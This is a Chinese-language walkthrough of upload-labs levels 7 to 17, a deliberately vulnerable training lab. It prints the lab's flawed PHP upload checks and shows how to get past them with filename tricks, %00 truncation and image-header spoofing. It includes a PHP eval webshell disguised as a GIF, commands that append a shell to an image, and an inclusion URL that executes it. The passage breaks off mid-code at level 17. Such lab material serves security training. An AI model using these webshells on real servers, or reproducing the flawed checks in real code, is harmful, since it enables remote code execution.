if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

这一关黑名单进一步升级，已经把 .htaccess 和 .ini 都加进去了，所以前面的 .htaccess 和 .user.ini 方法都失效。

同时保留了：

* strtolower()（大小写绕过失效）
* deldot()（末尾点绕过失效）
* 去除 ::$DATA
* 文件被重命名为随机名 + 后缀

**步骤：** 文件名设为 `shell.php `（php 后有空格），抓包确认文件名后上传。

![1787476808968-d84f0d98-8882-486c-8e3d-9968f071658c.png](./img/282317868/1787476808968-d84f0d98-8882-486c-8e3d-9968f071658c-218402.png)

![1787476829454-773ba3e7-f8f1-4470-b897-e70223e7bea7.png](./img/282317868/1787476829454-773ba3e7-f8f1-4470-b897-e70223e7bea7-352294.png)

![1787476845633-7a7dc77b-c175-44c5-80c3-2d9230b562e7.png](./img/282317868/1787476845633-7a7dc77b-c175-44c5-80c3-2d9230b562e7-641515.png)

![1787476896786-59fe4220-0ee0-4752-a09d-9ec835737905.png](./img/282317868/1787476896786-59fe4220-0ee0-4752-a09d-9ec835737905-729915.png)

***

### Pass-08：点号绕过（Windows）

**考点：** `shell.php.` 在 Windows 上常被存成 `shell.php`。

**源码逻辑（典型）：**

```properties
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

这一关和第七关相比，有两个关键变化：

1. **去掉了 \*\*\*\*deldot()**（不再删除文件名末尾的点）
2. 文件保存时使用**原始文件名**（$file_name），没有重命名

黑名单依然包含 .htaccess 和 .ini，并且有 strtolower() + trim()。

**步骤：** 上传文件名 `shell.php.`

![1787477307434-99b86ed4-1cb1-4a94-b9ce-3b21c9ffcdfe.png](./img/282317868/1787477307434-99b86ed4-1cb1-4a94-b9ce-3b21c9ffcdfe-142044.png)

![1787477329664-c9e79747-da53-4427-b0b6-e1ee5998165b.png](./img/282317868/1787477329664-c9e79747-da53-4427-b0b6-e1ee5998165b-207046.png)

![1787477354345-80e6f9a2-c43d-4408-a0d0-89752822eab7.png](./img/282317868/1787477354345-80e6f9a2-c43d-4408-a0d0-89752822eab7-992417.png)

![1787477400079-0961f002-3cfc-46a4-837a-1a010393c5fc.png](./img/282317868/1787477400079-0961f002-3cfc-46a4-837a-1a010393c5fc-809215.png)

***

### Pass-09：`::$DATA` 绕过（Windows NTFS）

**考点：** ADS（备用数据流）。`shell.php::$DATA` 校验像奇怪后缀，写入后主文件流仍可能是 `shell.php`。

**代码逻辑（典型）：**

```properties
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

这一关和前面几关对比，关键变化是：

* **恢复了 \*\*\*\*deldot()**（末尾点绕过失效）
* **去掉了去除 ****::$DATA**** 的代码**
* 文件会重命名为随机名 + 后缀
* 黑名单依然包含 .htaccess 和 .ini

原理：

* $file_ext = strrchr("shell.php::$DATA", '.') 得到 .php::$DATA
* 经过 strtolower 和 trim 后还是 .php::$DATA
* 黑名单里只有 .php，匹配不上，检查通过
* 在 Windows 系统上，xxx.php::$DATA 会被当作 xxx.php 的数据流来处理，最终生成可解析的 shell.php

**步骤：** 文件名使用 `shell.php::$DATA`

![1787477694830-5c1db861-b5fd-4b6f-8db3-e6660f95104e.png](./img/282317868/1787477694830-5c1db861-b5fd-4b6f-8db3-e6660f95104e-552106.png)

![1787477715810-06aa2a4b-2239-4b99-992c-c4a0a61b65d1.png](./img/282317868/1787477715810-06aa2a4b-2239-4b99-992c-c4a0a61b65d1-900505.png)

![1787477742707-911da99c-ac57-4140-a711-9e71809e3c54.png](./img/282317868/1787477742707-911da99c-ac57-4140-a711-9e71809e3c54-153311.png)

![1787477785423-650218be-9975-4fea-b143-109eb060bf89.png](./img/282317868/1787477785423-650218be-9975-4fea-b143-109eb060bf89-333384.png)

***

### Pass-10：点空格点组合

**考点：** `shell.php. .` 一类组合，利用校验与文件系统规范化不一致。

**代码逻辑（典型）：**

```properties
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```

这一关的防御比较完整：

* 有 deldot()（末尾点被防）
* 有 strtolower()（大小写被防）
* 有 str_ireplace('::$DATA', '', $file_ext)（简单 ADS 被防）
* 有 trim()
* 黑名单包含 .htaccess 和 .ini
* 文件保存时使用**原始文件名**（$file_name）

**步骤：** 尝试 `shell.php. .` 或类似变体，以抓包中实际文件名为准。

![1787479107470-93f6583c-eda4-489f-85f8-f851a17cec6b.png](./img/282317868/1787479107470-93f6583c-eda4-489f-85f8-f851a17cec6b-219081.png)

![1787479134175-32762010-cf9d-450f-b524-fc453350be3c.png](./img/282317868/1787479134175-32762010-cf9d-450f-b524-fc453350be3c-322802.png)

![1787479150472-cd1aa8b2-5697-41d8-9e82-74f10819b523.png](./img/282317868/1787479150472-cd1aa8b2-5697-41d8-9e82-74f10819b523-994462.png)

![1787479209092-999b6226-c278-462b-a9d9-545c81a4837e.png](./img/282317868/1787479209092-999b6226-c278-462b-a9d9-545c81a4837e-714377.png)

***

### Pass-11：双写绕过

**考点：** 服务端只替换一次 `.php` → 空。

```php
// 危险写法示意
$file_name = str_ireplace(".php", "", $file_name);
```

**代码逻辑（典型）：**

```properties
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess","ini");

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

这一关的核心逻辑变了：

```plain
$file_name = str_ireplace($deny_ext, "", $file_name);
```

它不再判断后缀是否在黑名单，而是**直接把文件名里出现的黑名单字符串（不区分大小写）全部替换成空**。

这是典型的「字符串替换黑名单」，可以用**双写绕过**。

把危险后缀进行嵌套双写，使替换后刚好剩下可用的 .php。

**推荐文件名：**

```plain
shell.pphphp
```

**原理演示：**

* 原始文件名：shell.pphphp
* 执行 str_ireplace 时，会匹配到中间的 php
* 替换后剩下：shell.php

其他可用双写示例：

| 上传时的文件名 | 替换后结果 | 说明 |
| --- | --- | --- |
| shell.pphphp | shell.php | 最常用，推荐 |
| shell.phphphp | shell.php | 也可以 |
| shell.phtmlhtml | shell.phtml | 如果环境支持 phtml |
| shell.aspasp | shell.asp | ASP 环境可用 |

**步骤：** 文件名使用 `shell.pphphp` → 去掉一层 `.php` 后剩下 `shell.php`。

![1787479776892-fb90ada8-01f7-4e03-943b-fcc10610d11e.png](./img/282317868/1787479776892-fb90ada8-01f7-4e03-943b-fcc10610d11e-181275.png)

![1787479802139-26787e26-1c38-47aa-9f05-e6e59db39cb7.png](./img/282317868/1787479802139-26787e26-1c38-47aa-9f05-e6e59db39cb7-509520.png)

![1787479812853-5e62a887-a1fe-4128-b37d-945b7d2bb838.png](./img/282317868/1787479812853-5e62a887-a1fe-4128-b37d-945b7d2bb838-315433.png)

![1787479864986-1b275e7a-6d80-456b-bb3c-fdffc23ac07c.png](./img/282317868/1787479864986-1b275e7a-6d80-456b-bb3c-fdffc23ac07c-291494.png)

***

### Pass-12：白名单 + GET 型 `%00` 截断

**考点：** 只允许 `jpg/png/gif`，但保存路径或文件名参数可控；PHP < 5.3.4 且 `magic_quotes_gpc=Off` 时 `%00` 可截断。

**思路：**

* 路径形如：`upload/shell.php%00.jpg`
* 校验看到以 `.jpg` 结尾，底层写文件时在 `%00` 处截断 → 实际 `shell.php`

条件：

第十二关我们看代码，可以得知是一个白名单，只允许上传 jpg，png，gif 格式的文件。但是上传路径是可以控制的，可以使用 %00 进行截断。%00 只能用于 php 版本低于 5.3 的。这里我们需要把 phpstudy 切换一下版本,把 magic_quotes_gpc 关闭，以 phpstudy 为例。其他选项菜单，php 扩展及设置，参数开关设置，把magic_quotes_gpc 关闭。

![1787480779061-09e1b7aa-84c4-492f-baf8-1f2875a92ce3.png](./img/282317868/1787480779061-09e1b7aa-84c4-492f-baf8-1f2875a92ce3-219840.png)

**代码逻辑（典型）：**

```properties
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

这一关是**白名单**验证，只允许 jpg、png、gif 后缀。

但核心漏洞在于这一行：

```plain
$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

**save_path 参数完全由用户控制**，没有做任何过滤，存在目录遍历 / 路径可控问题。

**步骤：** Burp 改 `save_path` 或文件名相关参数为带 `%00` 的形式（GET 传参时注意编码）。

![1787480445011-83f58d6f-0216-4f1d-8a26-2c5704b7afb0.png](./img/282317868/1787480445011-83f58d6f-0216-4f1d-8a26-2c5704b7afb0-110782.png)

![1787480476496-701fa046-b393-400f-b37c-988dafaddfa2.png](./img/282317868/1787480476496-701fa046-b393-400f-b37c-988dafaddfa2-758089.png)

这里得把后面的部分删除掉，保留 php 才可以显示。

![1787480501966-999ca91e-9b79-42c1-9850-5093aaf4d5d1.png](./img/282317868/1787480501966-999ca91e-9b79-42c1-9850-5093aaf4d5d1-757750.png)

![1787480541627-20109baa-ee2d-4e70-803f-662bd8b4f78d.png](./img/282317868/1787480541627-20109baa-ee2d-4e70-803f-662bd8b4f78d-921087.png)

![1787480592303-5b2331e4-5473-4fda-a2f3-ef34f373f0e9.png](./img/282317868/1787480592303-5b2331e4-5473-4fda-a2f3-ef34f373f0e9-267064.png)

***

### Pass-13：白名单 + POST 型 `%00` 截断

与 12 类似，截断发生在 POST 字段；抓包时对二进制 `0x00` 直接改包（不要只写成字符串 `%00` 却被再次编码搞错）。

**代码逻辑（典型）：**

```properties
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传失败";
        }
    } else {
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

这一关和第十二关几乎一模一样，唯一的区别是：

```plain
// 第12关
$img_path = $_GET['save_path'] . "/...";

// 第13关
$img_path = $_POST['save_path'] . "/...";
```

save_path 从 **GET** 改成了 **POST**，但依然完全可控，没有做任何过滤。

**步骤：**  第十三关和第十二关是差不多的，只不过是接受值变成了 post ，它两的差别就是 get 会自行解码，post  不会自行解码，我们需要对 %00 进行编码,选中 %00 右键

![1787481316382-b5f895dd-7e62-4104-a388-b5fa4d5f4f25.png](./img/282317868/1787481316382-b5f895dd-7e62-4104-a388-b5fa4d5f4f25-877624.png)

编码好，进行上传

![1787481314294-6c46efc7-57bf-4e5f-b5a6-e473780dfb69.png](./img/282317868/1787481314294-6c46efc7-57bf-4e5f-b5a6-e473780dfb69-185039.png)

![1787481490299-2d6f743f-e25e-4ef9-9833-88e3d150aa47.png](./img/282317868/1787481490299-2d6f743f-e25e-4ef9-9833-88e3d150aa47-905481.png)

![1787481507365-eb06772c-2e50-4369-bc8a-1a96fce44989.png](./img/282317868/1787481507365-eb06772c-2e50-4369-bc8a-1a96fce44989-255578.png)

![1787481580104-8dd2c5fc-cd83-4b1a-850a-5ccfbc08b758.png](./img/282317868/1787481580104-8dd2c5fc-cd83-4b1a-850a-5ccfbc08b758-975457.png)

***

### Pass-14：图片检测（getimagesize / 文件头）

**考点：**

服务端不再只看后缀或 MIME，而是判断**内容是否像图片**，常见手段：

* getimagesize($tmp_name)
* 或读取文件头（Magic Number）

**代码逻辑（典型）：**

```plain
function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

| 关键点 | 含义 |
| --- | --- |
| getimagesize | 能解析出图像信息则返回数组，否则 false |
| 可能仍保留原名 | 若未强制改后缀，需结合本关是否还有扩展名限制 |
| 无二次渲染 | 文件几乎原样保存，图片中可夹带 PHP 代码 |

这一关开始检查**文件头（魔法数字 / Magic Number）**，不再相信后缀名。

```plain
// 只读取文件前2个字节判断类型
case 255216:  // FF D8 → jpg
case 13780:   // 89 50 → png
case 7173:    // 47 49 → gif
```

最终保存的后缀也是根据文件头来强制决定的（xxx.jpg / xxx.png / xxx.gif）。

不同图片对应的文件头（方便自己构造）

| 类型 | 文件头（十六进制） | 十进制判断值 | 手工构造示例 |
| --- | --- | --- | --- |
| GIF | `47 49 46 38 39 61` | 7173 | `GIF89a`<br/> + PHP代码 |
| JPG | `FF D8` | 255216 | 需要二进制编辑 |
| PNG | `89 50` | 13780 | 需要二进制编辑 |

优先用 GIF，最方便。

步骤：

构造 **图片马**：既满足图片特征，又包含 PHP 代码。

**方式一：GIF 头手写（常用）**

```plain
GIF89a
<?php @eval($_POST['cmd']); ?>
```

或者更完整一点：

```plain
GIF89a<?php phpinfo(); ?>
```

![1787545450169-4ddc1355-bb7e-40e1-b031-8acdfd9d7fd4.png](./img/282317868/1787545450169-4ddc1355-bb7e-40e1-b031-8acdfd9d7fd4-526273.png)

保存为 shell.gif（或本关允许的后缀），其实后缀无所谓，因为服务器只看文件头，上传即可。

![1787546099775-00cbe73a-79fb-44a3-9638-6f3f0bc9adde.png](./img/282317868/1787546099775-00cbe73a-79fb-44a3-9638-6f3f0bc9adde-178530.png)

上传成功后，服务器会把它保存成类似 46xxxxxxxx.gif 的文件。

下面这段代码中通过获取URL中的file参数，进行文件包含。执行图片文件。

```plain
http://xxx.xxx.xxx.xxx/upload-labs/include.php
```

![1787546150930-40b895ab-ed5e-4bc6-8c86-24221327ea84.png](./img/282317868/1787546150930-40b895ab-ed5e-4bc6-8c86-24221327ea84-032602.png)

访问我们上传的 phpinfo.gif，可以看到已经成功上传了。注意后面要加上?file=上传文件的名称。

```plain
http://xxx.xxx.xxx.xxx/upload-labs/include.php?file=xxxxx
```

![1787546214644-86defa7c-7cfa-4fa4-8b7f-a99f9ff472fb.png](./img/282317868/1787546214644-86defa7c-7cfa-4fa4-8b7f-a99f9ff472fb-343376.png)

![1787546338265-a86fd552-4306-4e1c-9adb-f13149c27ed4.png](./img/282317868/1787546338265-a86fd552-4306-4e1c-9adb-f13149c27ed4-483819.png)

**方式二：使用真实图片 + 追加代码**

1. **找一张正常的小图片（****.jpg**** / ****.png**** / ****.gif****）。**
2. **用十六进制编辑器（或 ****copy /b**** 命令）在图片末尾追加 PHP 代码：**

**Windows 命令示例：**

```plain
copy /b normal.jpg + shell.php shell.jpg
```

![1787548250349-b488b8db-964a-49fb-b481-6b9673a3aacc.png](./img/282317868/1787548250349-b488b8db-964a-49fb-b481-6b9673a3aacc-239088.png)

**Linux 命令示例：**

```plain
cat normal.jpg shell.php > shell.jpg
```

3. **上传生成的 shell.jpg。**

![1787548231496-2de5e9e2-91cd-4fe5-8bcc-1e979b50a7a9.png](./img/282317868/1787548231496-2de5e9e2-91cd-4fe5-8bcc-1e979b50a7a9-516128.png)

访问文件，可以看到 phpinfo 被执行成功了。

![1787548279732-425412a3-76f8-43f6-a128-a56021c1d7e0.png](./img/282317868/1787548279732-425412a3-76f8-43f6-a128-a56021c1d7e0-312613.png)

![1787548417567-8586b377-9127-42b9-9c81-f1308c165f76.png](./img/282317868/1787548417567-8586b377-9127-42b9-9c81-f1308c165f76-260600.png)

方式三：通过上传正常图片的时候抓包添加 php 一句话木马。

抓包后，在图片后面写上 php 一句话木马，然后放包。

![1787549173231-9079dc16-95b8-46c5-abfc-0457167c28b2.png](./img/282317868/1787549173231-9079dc16-95b8-46c5-abfc-0457167c28b2-293567.png)

![1787549148507-e6d2ca56-a8ea-409a-8e2a-515d2da6e485.png](./img/282317868/1787549148507-e6d2ca56-a8ea-409a-8e2a-515d2da6e485-649826.png)

![1787549220609-872724e1-3672-4aae-a74b-e011ddc8b706.png](./img/282317868/1787549220609-872724e1-3672-4aae-a74b-e011ddc8b706-678607.png)

![1787549281348-77cc856c-edbb-4f78-b66a-d98d835555f9.png](./img/282317868/1787549281348-77cc856c-edbb-4f78-b66a-d98d835555f9-194556.png)

***

### Pass-15：加强版图片检测

**考点：**

在 Pass-14 基础上，往往**同时**检查：

* 扩展名白名单（如只允许 jpg/png/gif）
* getimagesize 或等价判断

个别版本还会看 MIME。需要「合法后缀 + 通过图片函数」。

**代码逻辑（典型）：**

```plain
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)>=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

这一关使用了更严格的图片检测：

```plain
$info = getimagesize($filename);
$ext  = image_type_to_extension($info[2]);
```

getimagesize() 会真正去解析图片结构，比第14关只读2个字节要严格一些。

**绕过思路**

1. 文件名使用白名单后缀：shell.jpg / shell.png / shell.gif
2. 内容为图片马（GIF89a + PHP，或真图追加 PHP）
3. 上传成功后，执行依赖：
   * Apache 解析漏洞（如错误配置下 xx.php.jpg）
   * 或本关仅要求「过检测」
   * 或配合其它包含点（视环境）

**步骤：**

**方法一：真实图片 + 追加代码（成功率最高）**

1. 准备一张正常的小图片（jpg / png / gif 均可）。
2. 把 webshell 代码追加到图片后面：

**Windows：**

```plain
copy /b normal.jpg + shell.php shell.jpg
```

**Linux / macOS：**

```plain
cat normal.jpg shell.php > shell.jpg
```

3. 上传生成的 shell.jpg。

![1787550823884-42a3297a-b1af-47ca-b3ff-60d4448ed9cb.png](./img/282317868/1787550823884-42a3297a-b1af-47ca-b3ff-60d4448ed9cb-139414.png)

![1787550847250-17b9b574-503b-4d35-a33e-dbb09b6a9914.png](./img/282317868/1787550847250-17b9b574-503b-4d35-a33e-dbb09b6a9914-525403.png)

![1787550874193-59ba1dd4-8dea-4cba-be28-dc5df54ff04f.png](./img/282317868/1787550874193-59ba1dd4-8dea-4cba-be28-dc5df54ff04f-105376.png)

**方法二：GIF 图片马（简单快速）**

新建文件，内容写：

```plain
GIF89a
<?php @eval($_POST['cmd']); ?>
```

保存后上传（后缀无所谓，服务器会根据 getimagesize() 的结果重命名）。

![1787551069575-fba06351-1ca9-4e96-98e8-1bd2a42bef87.png](./img/282317868/1787551069575-fba06351-1ca9-4e96-98e8-1bd2a42bef87-881089.png)

![1787551048305-7f7dc68a-25d8-42b7-af9e-7fb6da877de1.png](./img/282317868/1787551048305-7f7dc68a-25d8-42b7-af9e-7fb6da877de1-724748.png)

![1787551120406-2e9da5d2-07d4-468b-a3b6-b4ac018fc818.png](./img/282317868/1787551120406-2e9da5d2-07d4-468b-a3b6-b4ac018fc818-512602.png)

***

### Pass-16：图片检测变体（exif / 其它判断）

**<font style="color:#DF2A3F;">注意，需要提前开启 exif 模块，上传图片才可以生效。</font>**

![1787554741607-1c6320d2-e146-45e3-a1f6-4474ddd65664.png](./img/282317868/1787554741607-1c6320d2-e146-45e3-a1f6-4474ddd65664-503646.png)

**考点：**

部分版本在 14/15 基础上改用：

* exif_imagetype()
* 或更严的文件头比对
* 或先检查后缀再检查内容

思路仍与图片马一致，但**必须让所用 API 返回“是图片”**。

**代码逻辑（典型）：**

```plain
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}

```

| 函数 | 说明 |
| --- | --- |
| exif_imagetype | 根据文件头判断图像类型，需 php_exif |
| 与 getimagesize | 都偏“头/结构”，不保证无脚本内容 |

**绕过思路**

* 优先用**真实**小 GIF/JPG/PNG，再在末尾追加 PHP，提高 exif_imagetype 成功率
* 纯手写 GIF89a 在部分环境下也可行，失败则换真图

**步骤：**

**方法一：真实图片 + 追加代码（最稳）**

```plain
`# Windows
copy /b normal.jpg + shell.php shell.jpg

# Linux / macOS
cat normal.jpg shell.php > shell.jpg
```

上传生成的 shell.jpg 即可。

![1787555036234-254000af-62f2-4728-b82f-eca476bb6da9.png](./img/282317868/1787555036234-254000af-62f2-4728-b82f-eca476bb6da9-665657.png)

![1787555052483-31a095a5-a343-47d0-a309-9f3941bb61ea.png](./img/282317868/1787555052483-31a095a5-a343-47d0-a309-9f3941bb61ea-304567.png)

![1787555112836-b00d14a8-0beb-4ec1-bf4f-142102c3990b.png](./img/282317868/1787555112836-b00d14a8-0beb-4ec1-bf4f-142102c3990b-005274.png)

**方法二：GIF 图片马（最简单）**

新建一个文件，内容写：

```plain
GIF89a
<?php @eval($_POST['cmd']); ?>
```

保存后直接上传。

![1787555159335-7629a7c9-b97b-4eea-81bf-2ef888b5dbe2.png](./img/282317868/1787555159335-7629a7c9-b97b-4eea-81bf-2ef888b5dbe2-158658.png)

![1787555185050-abc3af05-f95c-40b7-94c0-bc1405149769.png](./img/282317868/1787555185050-abc3af05-f95c-40b7-94c0-bc1405149769-162264.png)

![1787555226021-1628922d-d5e2-441b-b94a-8d5a722da231.png](./img/282317868/1787555226021-1628922d-d5e2-441b-b94a-8d5a722da231-393217.png)

***

### Pass-17：二次渲染

**<font style="color:#DF2A3F;">注意：这关得使用 010Editor 13.0 的版本，新版本 010Editor 16.0 的版本插入一句话木马会有问题的。</font>**

**考点：** 服务端用 GD 等重新生成图片，破坏插入的 PHP。

**思路方向：**

* 研究渲染后仍存活的载荷位置（难度高，依赖算法与格式）
* 或寻找渲染逻辑 bug、竞赛窗口等其它面
* 部分 Writeup 使用特定构造的 PNG/JPG 使有效载荷在处理后残留

**代码逻辑（典型）：**

```plain
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
